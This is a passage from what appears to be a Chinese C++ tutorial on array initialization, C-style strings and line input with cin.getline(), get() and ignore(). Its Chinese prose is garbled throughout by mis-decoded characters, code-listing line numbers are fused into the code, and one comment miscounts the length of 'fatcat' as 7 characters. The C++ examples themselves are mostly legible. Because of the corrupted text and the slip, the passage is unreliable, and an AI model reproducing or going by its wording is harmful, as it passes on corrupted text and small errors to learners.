å¦‚æœåœ¨å£°æ˜æ•°ç»„æ—¶æ²¡æœ‰æä¾›åˆå§‹åŒ–åˆ—è¡¨ï¼ˆä»…é€‚ç”¨äºéé™æ€å±€éƒ¨æ•°ç»„ï¼‰ï¼Œåˆ™æ•°ç»„å…ƒç´ çš„å€¼æ˜¯æœªå®šä¹‰çš„ (indeterminate)**ï¼Œå®ƒä»¬ä¼šåŒ…å«å†…å­˜ä¸­é—ç•™çš„åƒåœ¾å€¼ã€‚ä½¿ç”¨æœªåˆå§‹åŒ–çš„å˜é‡æ˜¯å¸¸è§çš„é”™è¯¯æ¥æºã€‚** 12345678int main() &#123; int garbage[5]; // æ•°ç»„å…ƒç´ çš„å€¼æ˜¯æœªå®šä¹‰çš„ (åƒåœ¾å€¼) // std::cout &lt;&lt; garbage[0]; // é”™è¯¯! ä½¿ç”¨æœªåˆå§‹åŒ–çš„å€¼ static int staticGarbage[5]; // é™æ€å­˜å‚¨æ•°ç»„ä¼šè¢«é»˜è®¤åˆå§‹åŒ–ä¸º 0 // std::cout &lt;&lt; staticGarbage[0]; // è¾“å‡º 0 return 0;&#125; (é™æ€å­˜å‚¨æŒç»­æ€§çš„å˜é‡ï¼Œå¦‚å…¨å±€å˜é‡ã€å‘½åç©ºé—´å˜é‡ã€é™æ€å±€éƒ¨å˜é‡ï¼Œä¼šè¢«é»˜è®¤é›¶åˆå§‹åŒ–) ç”¨æ³•ä¸ç¤ºä¾‹: 12345678910111213141516171819202122232425#include &lt;iostream&gt;int main() &#123; // å®Œæ•´åˆå§‹åŒ– int fibonacci[8] = &#123;0, 1, 1, 2, 3, 5, 8, 13&#125;; std::cout &lt;&lt; &quot;Fibonacci[5]: &quot; &lt;&lt; fibonacci[5] &lt;&lt; std::endl; // è¾“å‡º 8 // éƒ¨åˆ†åˆå§‹åŒ– double data[5] = &#123;1.1, 2.2&#125;; std::cout &lt;&lt; &quot;Data[0]: &quot; &lt;&lt; data[0] &lt;&lt; std::endl; // è¾“å‡º 1.1 std::cout &lt;&lt; &quot;Data[1]: &quot; &lt;&lt; data[1] &lt;&lt; std::endl; // è¾“å‡º 2.2 std::cout &lt;&lt; &quot;Data[2]: &quot; &lt;&lt; data[2] &lt;&lt; std::endl; // è¾“å‡º 0 std::cout &lt;&lt; &quot;Data[3]: &quot; &lt;&lt; data[3] &lt;&lt; std::endl; // è¾“å‡º 0 std::cout &lt;&lt; &quot;Data[4]: &quot; &lt;&lt; data[4] &lt;&lt; std::endl; // è¾“å‡º 0 // çœç•¥å¤§å° char vowels[] = &#123;&#x27;a&#x27;, &#x27;e&#x27;, &#x27;i&#x27;, &#x27;o&#x27;, &#x27;u&#x27;&#125;; std::cout &lt;&lt; &quot;Number of vowels: &quot; &lt;&lt; sizeof(vowels) / sizeof(char) &lt;&lt; std::endl; // è¾“å‡º 5 // åˆå§‹åŒ–æ‰€æœ‰å…ƒç´ ä¸º 0 int results[20] = &#123;0&#125;; std::cout &lt;&lt; &quot;Results[15]: &quot; &lt;&lt; results[15] &lt;&lt; std::endl; // è¾“å‡º 0 return 0;&#125; 4.1.3 C++11æ•°ç»„åˆå§‹åŒ–æ–¹æ³•C++11 å¼•å…¥äº†æ›´ç»Ÿä¸€çš„åˆå§‹åŒ–è¯­æ³•ï¼Œç§°ä¸ºåˆ—è¡¨åˆå§‹åŒ– (List Initialization) æˆ–**èŠ±æ‹¬å·åˆå§‹åŒ– (Brace Initialization)**ï¼Œå®ƒä¹Ÿå¯ä»¥ç”¨äºæ•°ç»„ã€‚ ä¸»è¦å˜åŒ–: å¯ä»¥çœç•¥ç­‰å· =: åœ¨ä½¿ç”¨åˆå§‹åŒ–åˆ—è¡¨æ—¶ï¼Œå¯ä»¥çœç•¥å£°æ˜è¯­å¥ä¸­çš„ç­‰å·ã€‚ ç¦æ­¢ç¼©çª„è½¬æ¢ (Narrowing Conversion): åˆ—è¡¨åˆå§‹åŒ–ä¸å…è®¸å¯èƒ½å¯¼è‡´æ•°æ®ä¸¢å¤±çš„â€œç¼©çª„â€è½¬æ¢ã€‚ä¾‹å¦‚ï¼Œä¸èƒ½å°†æµ®ç‚¹æ•°ç›´æ¥åˆå§‹åŒ–ç»™æ•´å‹æ•°ç»„å…ƒç´ ï¼Œä¹Ÿä¸èƒ½å°†è¶…å‡ºèŒƒå›´çš„æ•´æ•°å€¼åˆå§‹åŒ–ç»™è¾ƒå°èŒƒå›´çš„æ•´å‹æ•°ç»„å…ƒç´ ã€‚ è¯­æ³•: 12typeName arrayName[arraySize] &#123;initializer_list&#125;; // C++11 åˆ—è¡¨åˆå§‹åŒ– (å¯çœç•¥ç­‰å·)typeName arrayName[] &#123;initializer_list&#125;; // çœç•¥å¤§å° ç”¨æ³•ä¸ç¤ºä¾‹: 12345678910111213141516171819202122232425#include &lt;iostream&gt;int main() &#123; // C++11 åˆ—è¡¨åˆå§‹åŒ– (çœç•¥ç­‰å·) int scores[5] &#123;90, 85, 92, 78, 88&#125;; double lengths[3] &#123;1.2, 3.4, 0.5&#125;; int counts[10] &#123;1, 2, 3&#125;; // éƒ¨åˆ†åˆå§‹åŒ–ï¼Œå‰©ä½™å…ƒç´ ä¸º 0 int allZeros[100] &#123;&#125;; // æ‰€æœ‰å…ƒç´ åˆå§‹åŒ–ä¸º 0 (ç©ºåˆ—è¡¨) short values[] &#123;10, 20, 30, 40&#125;; // çœç•¥å¤§å° std::cout &lt;&lt; &quot;Scores[1]: &quot; &lt;&lt; scores[1] &lt;&lt; std::endl; // è¾“å‡º 85 std::cout &lt;&lt; &quot;Counts[5]: &quot; &lt;&lt; counts[5] &lt;&lt; std::endl; // è¾“å‡º 0 std::cout &lt;&lt; &quot;allZeros[50]: &quot; &lt;&lt; allZeros[50] &lt;&lt; std::endl; // è¾“å‡º 0 std::cout &lt;&lt; &quot;Size of values: &quot; &lt;&lt; sizeof(values) / sizeof(short) &lt;&lt; std::endl; // è¾“å‡º 4 // ç¦æ­¢ç¼©çª„è½¬æ¢ç¤ºä¾‹ // int errors[3] &#123;1, 2, 3.0&#125;; // é”™è¯¯! double (3.0) åˆ° int æ˜¯ç¼©çª„è½¬æ¢ // char chars[2] &#123; &#x27;a&#x27;, 300 &#125;; // é”™è¯¯! 300 è¶…å‡º char çš„èŒƒå›´ (å‡è®¾ char æ˜¯ 8 ä½) // å…è®¸éç¼©çª„è½¬æ¢ char chars_ok[3] &#123; &#x27;a&#x27;, 66, &#x27;c&#x27; &#125;; // 66 åœ¨ char èŒƒå›´å†…ï¼Œå¯ä»¥éšå¼è½¬æ¢ä¸º &#x27;B&#x27; std::cout &lt;&lt; &quot;Chars OK: &quot; &lt;&lt; chars_ok[0] &lt;&lt; chars_ok[1] &lt;&lt; chars_ok[2] &lt;&lt; std::endl; // è¾“å‡º aBc return 0;&#125; å»ºè®®: C++11 çš„åˆ—è¡¨åˆå§‹åŒ–æä¾›äº†æ›´ä¸€è‡´ã€æ›´å®‰å…¨çš„åˆå§‹åŒ–æ–¹å¼ï¼Œæ¨èåœ¨æ”¯æŒ C++11 åŠæ›´é«˜æ ‡å‡†çš„é¡¹ç›®ä¸­ä½¿ç”¨ã€‚ç‰¹åˆ«æ˜¯ typeName arrayName[size] &#123;&#125;; è¿™ç§å°†æ‰€æœ‰å…ƒç´ åˆå§‹åŒ–ä¸ºé›¶å€¼çš„å½¢å¼éå¸¸æ–¹ä¾¿ã€‚ 4.2 å­—ç¬¦ä¸²å­—ç¬¦ä¸²æ˜¯ç¨‹åºä¸­ç”¨äºè¡¨ç¤ºæ–‡æœ¬ä¿¡æ¯çš„é‡è¦æ•°æ®ç±»å‹ã€‚C++å¤„ç†å­—ç¬¦ä¸²æœ‰ä¸¤ç§ä¸»è¦æ–¹å¼ï¼š Cé£æ ¼å­—ç¬¦ä¸² (C-Style String): è¿™æ˜¯ç»§æ‰¿è‡ªCè¯­è¨€çš„æ–¹å¼ï¼Œå°†å­—ç¬¦ä¸²è§†ä¸ºå­˜å‚¨åœ¨ char æ•°ç»„ä¸­å¹¶ä»¥ç©ºå­—ç¬¦ (\\0) ç»“å°¾çš„å­—ç¬¦åºåˆ—ã€‚ string ç±»: C++æ ‡å‡†åº“æä¾›äº†ä¸€ä¸ªå¼ºå¤§çš„ string ç±»ï¼Œæä¾›äº†æ›´æ–¹ä¾¿ã€æ›´å®‰å…¨çš„å­—ç¬¦ä¸²æ“ä½œï¼ˆå°†åœ¨ 4.3 èŠ‚ä»‹ç»ï¼‰ã€‚ æœ¬èŠ‚ä¸»è¦å…³æ³¨ C é£æ ¼å­—ç¬¦ä¸²ã€‚ å­—ç¬¦ä¸²å­—é¢å€¼ (String Literal) æˆ–å­—ç¬¦ä¸²å¸¸é‡ (String Constant):åœ¨ä»£ç ä¸­ç”¨åŒå¼•å· &quot;&quot; æ‹¬èµ·æ¥çš„å­—ç¬¦åºåˆ—ï¼Œä¾‹å¦‚ &quot;Hello, world!&quot;, &quot;C++&quot;, &quot;&quot; (ç©ºå­—ç¬¦ä¸²)ã€‚å®ƒä»¬å­˜å‚¨åœ¨å†…å­˜çš„åªè¯»åŒºåŸŸã€‚ç¼–è¯‘å™¨ä¼šè‡ªåŠ¨åœ¨å­—ç¬¦ä¸²å­—é¢å€¼çš„æœ«å°¾æ·»åŠ ç©ºå­—ç¬¦ \\0ã€‚ 4.2.1 æ‹¼æ¥å­—ç¬¦ä¸²å¸¸é‡C++å…è®¸å°†ç›¸é‚»çš„å­—ç¬¦ä¸²å­—é¢å€¼è‡ªåŠ¨æ‹¼æ¥ï¼ˆè¿æ¥ï¼‰æˆä¸€ä¸ªå•ç‹¬çš„å­—ç¬¦ä¸²ã€‚è¿™å¯¹äºå°†è¾ƒé•¿çš„å­—ç¬¦ä¸²åˆ†æˆå¤šè¡Œä¹¦å†™éå¸¸æœ‰ç”¨ï¼Œå¯ä»¥æé«˜ä»£ç çš„å¯è¯»æ€§ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 123456789101112131415161718192021222324252627282930313233#include &lt;iostream&gt;int main() &#123; // ç›¸é‚»çš„å­—ç¬¦ä¸²å­—é¢å€¼ä¼šè¢«è‡ªåŠ¨æ‹¼æ¥ std::cout &lt;&lt; &quot;This is the first part, &quot; &quot;and this is the second part.&quot; &lt;&lt; std::endl; // è¾“å‡º: This is the first part, and this is the second part. // å¯ä»¥è·¨è¶Šå¤šè¡Œ std::cout &lt;&lt; &quot;Line 1: Some text...\\n&quot; &quot;Line 2: More text...\\n&quot; &quot;Line 3: Final line.&quot; &lt;&lt; std::endl; /* è¾“å‡º: Line 1: Some text... Line 2: More text... Line 3: Final line. */ // æ‹¼æ¥ç»“æœæ˜¯ä¸€ä¸ªå•ç‹¬çš„å­—ç¬¦ä¸²å¸¸é‡ const char* long_message = &quot;Part 1. &quot; &quot;Part 2. &quot; &quot;Part 3.&quot;; std::cout &lt;&lt; long_message &lt;&lt; std::endl; // è¾“å‡º: Part 1. Part 2. Part 3. // æ³¨æ„ï¼šå˜é‡å’Œå­—ç¬¦ä¸²å­—é¢å€¼ä¸èƒ½è‡ªåŠ¨æ‹¼æ¥ std::string part1 = &quot;Hello&quot;; // std::cout &lt;&lt; part1 &quot; world!&quot;; // é”™è¯¯! ä¸èƒ½è¿™æ ·æ‹¼æ¥å˜é‡å’Œå­—é¢å€¼ // éœ€è¦ä½¿ç”¨ string ç±»çš„æ‹¼æ¥æ“ä½œ (è§ 4.3 èŠ‚) æˆ– cout çš„é“¾å¼è¾“å‡º std::cout &lt;&lt; part1 &lt;&lt; &quot; world!&quot; &lt;&lt; std::endl; // æ­£ç¡® return 0;&#125; 4.2.2 åœ¨æ•°ç»„ä¸­ä½¿ç”¨å­—ç¬¦ä¸²Cé£æ ¼å­—ç¬¦ä¸²æœ¬è´¨ä¸Šæ˜¯ char ç±»å‹çš„æ•°ç»„ï¼Œå…¶ç‰¹æ®Šä¹‹å¤„åœ¨äºæœ€åä¸€ä¸ªå­—ç¬¦å¿…é¡»æ˜¯**ç©ºå­—ç¬¦ (\\0)**ã€‚è¿™ä¸ªç©ºå­—ç¬¦æ ‡è®°äº†å­—ç¬¦ä¸²çš„å®é™…ç»“æŸä½ç½®ã€‚ å£°æ˜å’Œåˆå§‹åŒ–: å¯ä»¥ä½¿ç”¨å­—ç¬¦ä¸²å­—é¢å€¼æ¥åˆå§‹åŒ– char æ•°ç»„ã€‚ç¼–è¯‘å™¨ä¼šè‡ªåŠ¨è®¡ç®—å¤§å°ï¼ˆåŒ…æ‹¬æœ«å°¾çš„ \\0ï¼‰å¹¶å°†å…¶å¤åˆ¶åˆ°æ•°ç»„ä¸­ã€‚ 1234567891011121314151617181920212223242526272829303132333435#include &lt;iostream&gt;#include &lt;cstring&gt; // åŒ…å« C é£æ ¼å­—ç¬¦ä¸²å‡½æ•°åº“ (ä¾‹å¦‚ strlen)int main() &#123; // ä½¿ç”¨å­—ç¬¦ä¸²å­—é¢å€¼åˆå§‹åŒ– char æ•°ç»„ char dog[8] = &quot;fatcat&quot;; // æ•°ç»„å¤§å°å¿…é¡»è¶³å¤Ÿå®¹çº³å­—ç¬¦ä¸² + ç©ºå­—ç¬¦ (&#x27;f&#x27;,&#x27;a&#x27;,&#x27;t&#x27;,&#x27;c&#x27;,&#x27;a&#x27;,&#x27;t&#x27;,&#x27;\\0&#x27;) // dog æ•°ç»„å¤§å°ä¸º 8ï¼Œå®é™…ä½¿ç”¨ 7 ä¸ªå­—ç¬¦ + 1 ä¸ªç©ºå­—ç¬¦ char bird[] = &quot;wren&quot;; // ç¼–è¯‘å™¨è‡ªåŠ¨æ¨æ–­å¤§å°ä¸º 5 (&#x27;w&#x27;,&#x27;r&#x27;,&#x27;e&#x27;,&#x27;n&#x27;,&#x27;\\0&#x27;) // ä½¿ç”¨åˆ—è¡¨åˆå§‹åŒ– (éœ€è¦æ˜¾å¼åŒ…å«ç©ºå­—ç¬¦) char fish[] = &#123;&#x27;t&#x27;, &#x27;r&#x27;, &#x27;o&#x27;, &#x27;u&#x27;, &#x27;t&#x27;, &#x27;\\0&#x27;&#125;; // é”™è¯¯ç¤ºä¾‹ï¼šæ•°ç»„å¤§å°ä¸è¶³ // char cat[3] = &quot;cat&quot;; // é”™è¯¯! éœ€è¦å¤§å° 4 æ¥å­˜å‚¨ &#x27;c&#x27;,&#x27;a&#x27;,&#x27;t&#x27;,&#x27;\\0&#x27; std::cout &lt;&lt; &quot;Dog: &quot; &lt;&lt; dog &lt;&lt; std::endl; // cout é‡åˆ°ç©ºå­—ç¬¦åœæ­¢è¾“å‡º std::cout &lt;&lt; &quot;Bird: &quot; &lt;&lt; bird &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Fish: &quot; &lt;&lt; fish &lt;&lt; std::endl; // è®¿é—®å•ä¸ªå­—ç¬¦ std::cout &lt;&lt; &quot;Third letter of dog: &quot; &lt;&lt; dog[2] &lt;&lt; std::endl; // è¾“å‡º &#x27;t&#x27; dog[0] = &#x27;p&#x27;; // å¯ä»¥ä¿®æ”¹æ•°ç»„å†…å®¹ std::cout &lt;&lt; &quot;Modified dog: &quot; &lt;&lt; dog &lt;&lt; std::endl; // è¾“å‡º &quot;patcat&quot; // strlen() å‡½æ•°è®¡ç®—å­—ç¬¦ä¸²é•¿åº¦ (ä¸åŒ…æ‹¬ç©ºå­—ç¬¦) std::cout &lt;&lt; &quot;Length of dog: &quot; &lt;&lt; std::strlen(dog) &lt;&lt; std::endl; // è¾“å‡º 6 (å› ä¸ºç°åœ¨æ˜¯ &quot;patcat&quot;) std::cout &lt;&lt; &quot;Length of bird: &quot; &lt;&lt; std::strlen(bird) &lt;&lt; std::endl; // è¾“å‡º 4 // sizeof() è®¡ç®—æ•´ä¸ªæ•°ç»„å ç”¨çš„å†…å­˜å¤§å° (åŒ…æ‹¬ç©ºå­—ç¬¦å’Œæœªä½¿ç”¨çš„ç©ºé—´) std::cout &lt;&lt; &quot;Size of dog array: &quot; &lt;&lt; sizeof(dog) &lt;&lt; &quot; bytes&quot; &lt;&lt; std::endl; // è¾“å‡º 8 std::cout &lt;&lt; &quot;Size of bird array: &quot; &lt;&lt; sizeof(bird) &lt;&lt; &quot; bytes&quot; &lt;&lt; std::endl; // è¾“å‡º 5 return 0;&#125; å…³é”®ç‚¹: å­˜å‚¨ C é£æ ¼å­—ç¬¦ä¸²çš„ char æ•°ç»„å¤§å°å¿…é¡»è‡³å°‘æ˜¯å­—ç¬¦ä¸²é•¿åº¦åŠ  1ï¼ˆä¸º \\0 ç•™å‡ºç©ºé—´ï¼‰ã€‚ å­—ç¬¦ä¸²å­—é¢å€¼åˆå§‹åŒ–ä¼šè‡ªåŠ¨æ·»åŠ  \\0ã€‚ åˆ—è¡¨åˆå§‹åŒ–éœ€è¦æ‰‹åŠ¨æ·»åŠ  \\0ã€‚ strlen() è®¡ç®—çš„æ˜¯åˆ° \\0 ä¸ºæ­¢çš„å­—ç¬¦æ•°ã€‚ sizeof() è®¡ç®—çš„æ˜¯æ•´ä¸ªæ•°ç»„çš„å­—èŠ‚å¤§å°ã€‚ 4.2.3 å­—ç¬¦ä¸²è¾“å…¥ä½¿ç”¨ cin å’Œ &gt;&gt; è¿ç®—ç¬¦è¯»å– C é£æ ¼å­—ç¬¦ä¸²ï¼ˆå­˜å‚¨åœ¨ char æ•°ç»„ä¸­ï¼‰æ—¶ï¼Œå­˜åœ¨ä¸€ä¸ªä¸»è¦é™åˆ¶ï¼šcin é»˜è®¤ä»¥ç©ºç™½å­—ç¬¦ï¼ˆç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢è¡Œç¬¦ï¼‰ä½œä¸ºè¾“å…¥çš„åˆ†éš”ç¬¦ã€‚è¿™æ„å‘³ç€ cin &gt;&gt; åªä¼šè¯»å–åˆ°ç¬¬ä¸€ä¸ªç©ºç™½å­—ç¬¦ä¹‹å‰çš„éƒ¨åˆ†ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 123456789101112131415161718#include &lt;iostream&gt;int main() &#123; const int SIZE = 20; char name[SIZE]; char dessert[SIZE]; std::cout &lt;&lt; &quot;Enter your first name: &quot;; std::cin &gt;&gt; name; // è¯»å–ç›´åˆ°é‡åˆ°ç¬¬ä¸€ä¸ªç©ºç™½å­—ç¬¦ std::cout &lt;&lt; &quot;Enter your favorite dessert: &quot;; std::cin &gt;&gt; dessert; // è¯»å–ç›´åˆ°é‡åˆ°ç¬¬ä¸€ä¸ªç©ºç™½å­—ç¬¦ std::cout &lt;&lt; &quot;Hello, &quot; &lt;&lt; name &lt;&lt; &quot;!&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;I see you like &quot; &lt;&lt; dessert &lt;&lt; &quot;.&quot; &lt;&lt; std::endl; return 0;&#125; è¿è¡Œç¤ºä¾‹åŠé—®é¢˜: å¦‚æœç”¨æˆ·è¾“å…¥ï¼š 12Enter your first name: Ada LovelaceEnter your favorite dessert: Chocolate Cake ç¨‹åºè¾“å‡ºå°†ä¼šæ˜¯ï¼š 12Hello, Ada!I see you like Lovelace. åŸå› : cin &gt;&gt; name; è¯»å–åˆ° â€œAdaâ€ åé‡åˆ°ç©ºæ ¼åœæ­¢ï¼Œâ€Adaâ€ è¢«å­˜å…¥ name æ•°ç»„ï¼ˆå¹¶è‡ªåŠ¨æ·»åŠ  \\0ï¼‰ã€‚ â€œ Lovelace\\nChocolate Cake\\nâ€ ä»ç„¶ç•™åœ¨è¾“å…¥ç¼“å†²åŒºä¸­ã€‚ cin &gt;&gt; dessert; ä»ç¼“å†²åŒºå¼€å§‹è¯»å–ï¼Œè·³è¿‡å¼€å¤´çš„ç©ºæ ¼ï¼Œè¯»å–åˆ° â€œLovelaceâ€ åé‡åˆ°æ¢è¡Œç¬¦åœæ­¢ï¼Œâ€Lovelaceâ€ è¢«å­˜å…¥ dessert æ•°ç»„ã€‚ è¿™æ˜¾ç„¶ä¸æ˜¯æˆ‘ä»¬æœŸæœ›çš„ç»“æœã€‚cin &gt;&gt; ä¸é€‚åˆè¯»å–åŒ…å«ç©ºæ ¼çš„å­—ç¬¦ä¸²ã€‚æ­¤å¤–ï¼Œå¦‚æœç”¨æˆ·è¾“å…¥çš„å•è¯é•¿åº¦è¶…è¿‡äº†æ•°ç»„çš„å¤§å°ï¼ˆå‡å» \\0 çš„ç©ºé—´ï¼‰ï¼Œè¿˜ä¼šå¯¼è‡´**ç¼“å†²åŒºæº¢å‡º (Buffer Overflow)**ï¼Œè¿™æ˜¯ä¸¥é‡çš„å®‰å…¨éšæ‚£ã€‚ 4.2.4 æ¯æ¬¡è¯»å–ä¸€è¡Œå­—ç¬¦ä¸²è¾“å…¥ä¸ºäº†è§£å†³ cin &gt;&gt; çš„é—®é¢˜ï¼Œiostream åº“æä¾›äº†å…¶ä»–æˆå‘˜å‡½æ•°æ¥è¯»å–æ•´è¡Œè¾“å…¥ï¼ŒåŒ…æ‹¬å…¶ä¸­çš„ç©ºæ ¼ï¼Œç›´åˆ°é‡åˆ°æ¢è¡Œç¬¦ä¸ºæ­¢ã€‚å¸¸ç”¨çš„æœ‰ä¸¤ä¸ªï¼šgetline() å’Œ get()ã€‚ 1. cin.getline(char* buffer, int size, char delimiter = &#39;\\n&#39;) buffer: ç”¨äºå­˜å‚¨è¾“å…¥çš„ char æ•°ç»„ã€‚ size: ç¼“å†²åŒºçš„å¤§å°ã€‚getline() æœ€å¤šè¯»å– size - 1 ä¸ªå­—ç¬¦ï¼Œä»¥ç¡®ä¿æœ‰ç©ºé—´å­˜æ”¾æœ«å°¾çš„ç©ºå­—ç¬¦ \\0ã€‚ delimiter (å¯é€‰): æŒ‡å®šè¯»å–åœæ­¢çš„åˆ†éš”ç¬¦ï¼Œé»˜è®¤ä¸ºæ¢è¡Œç¬¦ \\nã€‚ è¡Œä¸º: è¯»å–å­—ç¬¦åˆ° buffer ä¸­ï¼Œç›´åˆ°è¯»å–äº† size - 1 ä¸ªå­—ç¬¦ã€é‡åˆ° delimiter æˆ–åˆ°è¾¾æ–‡ä»¶æœ«å°¾ã€‚ å¦‚æœé‡åˆ° delimiterï¼Œå®ƒä¼šè¯»å–å¹¶ä¸¢å¼ƒè¯¥åˆ†éš”ç¬¦ï¼ˆé€šå¸¸æ˜¯æ¢è¡Œç¬¦ï¼‰ã€‚ æ€»æ˜¯åœ¨è¯»å–çš„å­—ç¬¦åºåˆ—æœ«å°¾æ·»åŠ ç©ºå­—ç¬¦ \\0ã€‚ 2. cin.get(char* buffer, int size, char delimiter = &#39;\\n&#39;) å‚æ•°ä¸ getline() ç±»ä¼¼ã€‚ è¡Œä¸º: è¯»å–å­—ç¬¦åˆ° buffer ä¸­ï¼Œç›´åˆ°è¯»å–äº† size - 1 ä¸ªå­—ç¬¦ã€é‡åˆ° delimiter æˆ–åˆ°è¾¾æ–‡ä»¶æœ«å°¾ã€‚ ä¸ getline() ä¸åŒçš„æ˜¯ï¼Œå¦‚æœé‡åˆ° delimiterï¼Œå®ƒä¸ä¼šè¯»å–è¯¥åˆ†éš”ç¬¦ï¼Œè€Œæ˜¯å°†å…¶ç•™åœ¨è¾“å…¥ç¼“å†²åŒºä¸­ã€‚ æ€»æ˜¯åœ¨è¯»å–çš„å­—ç¬¦åºåˆ—æœ«å°¾æ·»åŠ ç©ºå­—ç¬¦ \\0ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;iostream&gt;int main() &#123; const int SIZE = 50; char fullName[SIZE]; char address[SIZE]; // ä½¿ç”¨ getline() std::cout &lt;&lt; &quot;Enter your full name: &quot;; std::cin.getline(fullName, SIZE); // è¯»å–æ•´è¡Œï¼ŒåŒ…æ‹¬ç©ºæ ¼ï¼Œä¸¢å¼ƒæ¢è¡Œç¬¦ std::cout &lt;&lt; &quot;Enter your address: &quot;; std::cin.getline(address, SIZE); // è¯»å–ä¸‹ä¸€è¡Œ std::cout &lt;&lt; &quot;Name: &quot; &lt;&lt; fullName &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Address: &quot; &lt;&lt; address &lt;&lt; std::endl; std::cout &lt;&lt; &quot;--------------------&quot; &lt;&lt; std::endl; // ä½¿ç”¨ get() - æ³¨æ„æ¢è¡Œç¬¦é—®é¢˜ char title[SIZE]; char author[SIZE]; std::cout &lt;&lt; &quot;Enter book title: &quot;; std::cin.get(title, SIZE); // è¯»å–æ•´è¡Œï¼Œæ¢è¡Œç¬¦ç•™åœ¨ç¼“å†²åŒº // å¦‚æœç›´æ¥è°ƒç”¨ä¸‹ä¸€ä¸ª get()ï¼Œå®ƒä¼šç«‹å³è¯»åˆ°ä¸Šä¸€ä¸ªç•™ä¸‹çš„æ¢è¡Œç¬¦å¹¶åœæ­¢ // std::cin.get(author, SIZE); // è¿™å°†å¯¼è‡´ author ä¸ºç©º // éœ€è¦å¤„ç†æ‰ç•™ä¸‹çš„æ¢è¡Œç¬¦ // æ–¹æ³•ä¸€ï¼šå†è°ƒç”¨ä¸€æ¬¡ get() è¯»å–å•ä¸ªå­—ç¬¦ // std::cin.get(); // è¯»å–å¹¶ä¸¢å¼ƒæ¢è¡Œç¬¦ // æ–¹æ³•äºŒï¼šä½¿ç”¨ ignore() è·³è¿‡å­—ç¬¦ std::cin.ignore(100, &#x27;\\n&#x27;); // è·³è¿‡æœ€å¤š100ä¸ªå­—ç¬¦ï¼Œç›´åˆ°é‡åˆ°æ¢è¡Œç¬¦ï¼ˆå¹¶ä¸¢å¼ƒæ¢è¡Œç¬¦ï¼‰ std::cout &lt;&lt; &quot;Enter author name: &quot;; std::cin.get(author, SIZE); // ç°åœ¨å¯ä»¥æ­£ç¡®è¯»å–ä½œè€…å std::cout &lt;&lt; &quot;Title: &quot; &lt;&lt; title &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Author: &quot; &lt;&lt; author &lt;&lt; std::endl; return 0;&#125; é€‰æ‹© getline() è¿˜æ˜¯ get()? getline() é€šå¸¸æ›´æ–¹ä¾¿ï¼Œå› ä¸ºå®ƒä¼šè‡ªåŠ¨å¤„ç†æ‰è¡Œå°¾çš„æ¢è¡Œç¬¦ï¼Œä½¿å¾—è¿ç»­è¯»å–å¤šè¡Œè¾“å…¥æ›´ç®€å•ã€‚ get() æä¾›äº†æ›´ç²¾ç»†çš„æ§åˆ¶ï¼Œå› ä¸ºå®ƒå…è®¸ä½ æ£€æŸ¥ä¸‹ä¸€ä¸ªå­—ç¬¦æ˜¯å¦æ˜¯æ¢è¡Œç¬¦ï¼Œä½†éœ€è¦ä½ æ‰‹åŠ¨å¤„ç†ç•™åœ¨ç¼“å†²åŒºçš„åˆ†éš”ç¬¦ã€‚ ç©ºè¡Œå’Œ getline(): å¦‚æœ getline() é‡åˆ°ç©ºè¡Œï¼ˆå³ç”¨æˆ·ç›´æ¥æŒ‰ Enterï¼‰ï¼Œå®ƒä¼šè¯»å–è¿™ä¸ªç©ºè¡Œï¼Œå°†ä¸€ä¸ªç©ºå­—ç¬¦ä¸²ï¼ˆåªåŒ…å« \\0ï¼‰å­˜å…¥ç¼“å†²åŒºï¼Œå¹¶ä¸¢å¼ƒæ¢è¡Œç¬¦ã€‚ 4.2.5 æ··åˆè¾“å…¥å­—ç¬¦ä¸²å’Œæ•°å­—å½“ç¨‹åºéœ€è¦äº¤æ›¿è¯»å–æ•°å­—ï¼ˆä½¿ç”¨ cin &gt;&gt;ï¼‰å’Œæ•´è¡Œå­—ç¬¦ä¸²ï¼ˆä½¿ç”¨ cin.getline() æˆ– cin.get()ï¼‰æ—¶ï¼Œç»å¸¸ä¼šé‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼šcin &gt;&gt; è¯»å–æ•°å­—åï¼Œä¼šå°†æ•°å­—åé¢çš„æ¢è¡Œç¬¦ç•™åœ¨è¾“å…¥ç¼“å†²åŒºä¸­ã€‚ å¦‚æœç´§æ¥ç€è°ƒç”¨ cin.getline() æˆ– cin.get()ï¼Œå®ƒä»¬ä¼šç«‹å³è¯»åˆ°è¿™ä¸ªæ®‹ç•™çš„æ¢è¡Œç¬¦ï¼Œå¹¶è®¤ä¸ºå·²ç»åˆ°è¾¾è¡Œå°¾ï¼Œå¯¼è‡´è¯»å–å¤±è´¥æˆ–è¯»åˆ°ç©ºå­—ç¬¦ä¸²ã€‚ é—®é¢˜ç¤ºä¾‹: 1234567891011121314151617#include &lt;iostream&gt;int main() &#123; int age; char name[50]; std::cout &lt;&lt; &quot;Enter your age: &quot;; std::cin &gt;&gt; age; // è¯»å–å¹´é¾„ï¼Œæ¢è¡Œç¬¦ç•™åœ¨ç¼“å†²åŒº std::cout &lt;&lt; &quot;Enter your full name: &quot;; std::cin.getline(name, 50); // ç«‹å³è¯»åˆ°æ®‹ç•™çš„æ¢è¡Œç¬¦ï¼Œgetline ç»“æŸï¼Œname ä¸ºç©º std::cout &lt;&lt; &quot;Age: &quot; &lt;&lt; age &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Name: [&quot; &lt;&lt; name &lt;&lt; &quot;]&quot; &lt;&lt; std::endl; // è¾“å‡º Name: [] return 0;&#125; è§£å†³æ–¹æ³•: åœ¨è¯»å–æ•°å­—åã€è°ƒç”¨ getline() æˆ– get() è¯»å–æ•´è¡Œä¹‹å‰ï¼Œéœ€è¦æ¶ˆè€—æ‰è¾“å…¥ç¼“å†²åŒºä¸­æ®‹ç•™çš„æ¢è¡Œç¬¦ã€‚ ä½¿ç”¨ cin.ignore(): è¿™æ˜¯å¸¸ç”¨çš„æ–¹æ³•ã€‚cin.ignore(n, delim) ä¼šè·³è¿‡è¾“å…¥æµä¸­çš„å­—ç¬¦ï¼Œç›´åˆ°è·³è¿‡äº† n 